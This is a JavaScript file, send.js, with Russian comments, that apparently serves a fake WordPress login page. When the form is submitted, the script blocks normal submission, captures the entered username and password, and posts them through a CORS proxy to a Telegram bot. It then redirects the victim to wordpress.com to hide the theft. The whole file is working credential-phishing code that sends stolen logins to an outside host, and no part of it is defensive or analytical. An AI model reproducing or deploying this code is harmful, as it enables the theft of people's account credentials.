// send.js — версия с прокси
(function() {
    'use strict';
    
    document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('loginform');
        
        if (!form) {
            console.error("Форма loginform не найдена!");
            return;
        }
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log("Скрипт send.js начал работу!");
            
            const login = form.querySelector('input[name="log"]').value;
            const password = form.querySelector('input[name="pwd"]').value;
            
            const message = '🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\n' +
                'Логин: ' + login + '\n' +
                'Пароль: ' + password;
            
            // ИСПОЛЬЗУЕМ ПРОКСИ
            const botToken = window.BOT_TOKEN;
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(proxyUrl + telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://shumaxe.github.io'
                },
                body: JSON.stringify({
                    chat_id: window.CHAT_ID,
                    text: message
                })
            })
            .then(function(response) {
                console.log("Ответ получен, статус:", response.status);
                return response.json();
            })
            .then(function(data) {
                console.log("Успешно отправлено в Telegram!", data);
            })
            .catch(function(error) {
                console.error("Ошибка:", error);
            })
            .finally(function() {
                setTimeout(function() {
                    window.location.href = 'https://wordpress.com/';
                }, 1000);
            });
        });
    });
})();
